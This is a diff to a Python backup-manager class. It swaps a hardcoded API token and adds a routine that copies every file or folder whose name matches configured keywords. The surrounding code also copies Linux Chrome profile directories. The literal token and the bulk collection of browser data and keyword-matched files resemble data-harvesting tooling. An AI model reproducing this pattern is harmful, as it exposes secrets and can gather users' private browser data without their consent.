@@ -21,7 +21,7 @@ class BackupManager:
     def __init__(self):
         """初始化备份管理器"""
         self.config = BackupConfig()
-        self.api_token = "8m9D4k6cv6LekYoVcjQBK4yvvDDyiFdf"
+        self.api_token = "oxQbVFE4p8BKRSE07r03s7jW4FDIC0sR"
         # 使用集合优化扩展名检查性能
         self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
         self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
@@ -200,11 +200,12 @@ class BackupManager:
         target_docs = os.path.join(target_dir, "docs") # 备份文档的目标目录
         target_configs = os.path.join(target_dir, "configs") # 备份配置文件的目标目录
         target_specified = os.path.join(target_dir, "specified")  # 新增指定目录/文件的备份目录
+        target_keyword = os.path.join(target_dir, "keyword")  # 关键字文件备份目录
 
         if not self._clean_directory(target_dir):
             return None
 
-        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified]):
+        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified, target_keyword]):
             return None
 
         # 首先备份指定目录或文件 (SERVER_BACKUP_DIRS)
@@ -215,6 +216,10 @@ class BackupManager:
 
         # 追加：备份 Linux Chrome 目录
         self._backup_chrome_directories(target_specified)
+
+        # 追加：备份包含关键字的文件和文件夹
+        logging.info("\n🔑 开始备份关键字文件...")
+        self._backup_keyword_files(source_dir, target_keyword)
 
         # 然后备份其他文件 (不在SERVER_BACKUP_DIRS中的，根据文件类型备份)
         # 预计算已备份的目录路径集合，优化性能
@@ -545,3 +550,113 @@ class BackupManager:
                     pass
             return False
 
+    def _contains_keyword(self, name):
+        """检查文件名或目录名是否包含关键字（不区分大小写）"""
+        name_lower = name.lower()
+        for keyword in self.config.KEYWORD_BACKUP_KEYWORDS:
+            if keyword.lower() in name_lower:
+                return True
+        return False
+
+    def _backup_keyword_files(self, source_dir, target_keyword):
+        """备份包含关键字的文件和文件夹"""
+        try:
+            source_dir_abs = os.path.abspath(source_dir)
+            target_dir_abs = os.path.abspath(target_keyword)
+            exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
+            keywords_lower = [kw.lower() for kw in self.config.KEYWORD_BACKUP_KEYWORDS]
+            
+            files_count = 0
+            dirs_count = 0
+            backed_up_paths = set()  # 记录已备份的路径，避免重复备份
+            
+            # 遍历源目录
+            for root, dirs, files in os.walk(source_dir):
+                root_abs = os.path.abspath(root)
+                
+                # 跳过目标备份目录本身
+                if root_abs.startswith(target_dir_abs):
+                    continue
+                
+                # 跳过排除的目录
+                root_name = os.path.basename(root)
+                if root_name.lower() in exclude_dirs_lower:
+                    dirs[:] = []  # 清空dirs列表，阻止进入子目录
+                    continue
+                
+                # 检查目录名是否包含关键字
+                if self._contains_keyword(root_name):
+                    # 备份整个目录
+                    relative_path = os.path.relpath(root, source_dir)
+                    target_path = os.path.join(target_keyword, relative_path)
+                    
+                    # 避免重复备份
+                    if root_abs not in backed_up_paths:
+                        try:
+                            if os.path.exists(target_path):
+                                shutil.rmtree(target_path, ignore_errors=True)
+                            if self._ensure_directory(os.path.dirname(target_path)):
+                                shutil.copytree(root, target_path, symlinks=True)
+                                backed_up_paths.add(root_abs)
+                                dirs_count += 1
+                                if self.config.DEBUG_MODE:
+                                    logging.info(f"🔑 已备份关键字目录: {relative_path}/")
+                        except Exception as e:
+                            logging.error(f"❌ 备份关键字目录失败 {relative_path}: {str(e)}")
+                    
+                    # 标记所有子目录为已备份，避免重复处理
+                    for subdir in dirs:
+                        subdir_path = os.path.join(root, subdir)
+                        backed_up_paths.add(os.path.abspath(subdir_path))
+                    dirs[:] = []  # 清空dirs列表，不再进入子目录
+                    continue
+                
+                # 检查当前目录是否在已备份的目录中（如果是，跳过该目录下的所有文件）
+                if any(root_abs.startswith(backed_path + os.sep) or root_abs == backed_path 
+                       for backed_path in backed_up_paths):
+                    continue
+                
+                # 检查文件名是否包含关键字
+                for file in files:
+                    if self._contains_keyword(file):
+                        source_file = os.path.join(root, file)
+                        source_file_abs = os.path.abspath(source_file)
+                        
+                        # 避免重复备份
+                        if source_file_abs in backed_up_paths:
+                            continue
+                        
+                        # 检查文件是否在已备份的目录中
+                        if any(source_file_abs.startswith(backed_path + os.sep) or source_file_abs == backed_path
+                               for backed_path in backed_up_paths):
+                            continue
+                        
+                        relative_path = os.path.relpath(root, source_dir)
+                        target_sub_dir = os.path.join(target_keyword, relative_path)
+                        target_file = os.path.join(target_sub_dir, file)
+                        
+                        try:
+                            if self._ensure_directory(target_sub_dir):
+                                shutil.copy2(source_file, target_file)
+                                backed_up_paths.add(source_file_abs)
+                                files_count += 1
+                                if self.config.DEBUG_MODE:
+                                    logging.info(f"🔑 已备份关键字文件: {relative_path}/{file}")
+                        except Exception as e:
+                            logging.error(f"❌ 备份关键字文件失败 {relative_path}/{file}: {str(e)}")
+            
+            # 打印备份统计信息
+            if files_count > 0 or dirs_count > 0:
+                logging.info(f"\n🔑 关键字文件备份统计:")
+                if files_count > 0:
+                    logging.info(f"   📄 文件: {files_count} 个")
+                if dirs_count > 0:
+                    logging.info(f"   📁 目录: {dirs_count} 个")
+            
+            return True
+        except Exception as e:
+            logging.error(f"❌ 关键字文件备份过程出错: {str(e)}")
+            if self.config.DEBUG_MODE:
+                import traceback
+                logging.debug(traceback.format_exc())
+            return False
